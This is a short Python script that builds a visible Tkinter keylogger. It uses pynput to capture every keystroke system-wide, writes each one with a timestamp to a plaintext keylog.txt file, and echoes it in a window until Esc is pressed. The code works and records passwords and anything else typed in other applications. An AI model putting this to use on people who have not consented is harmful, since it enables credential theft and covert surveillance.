from pynput import keyboard
import logging
import tkinter as tk

# Set up logging configuration
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        
        # Set up the text box in the GUI
        self.text_box = tk.Text(self.root, wrap='word', height=20, width=50)
        self.text_box.pack(expand=True, fill='both')

        # Disable editing of the text box
        self.text_box.config(state=tk.DISABLED)

        # Start the key listener
        self.start_listener()

    def start_listener(self):
        """ Start the key listener. """
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()

    def on_press(self, key):
        """ Callback function to be called when a key is pressed. """
        try:
            log_message = f"Key pressed: {key.char}\n"
        except AttributeError:
            log_message = f"Special key pressed: {key}\n"

        # Log the key press
        logging.info(log_message.strip())

        # Display the key press in the text box
        self.update_text_box(log_message)

    def on_release(self, key):
        """ Callback function to be called when a key is released. """
        if key == keyboard.Key.esc:
            # Stop listener when 'esc' key is pressed
            self.root.quit()

    def update_text_box(self, message):
        """ Update the text box with the latest key press. """
        # Enable editing, insert the message, and then disable editing
        self.text_box.config(state=tk.NORMAL)
        self.text_box.insert(tk.END, message)
        self.text_box.see(tk.END)  # Scroll to the end of the text box
        self.text_box.config(state=tk.DISABLED)

# Set up the main application window
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
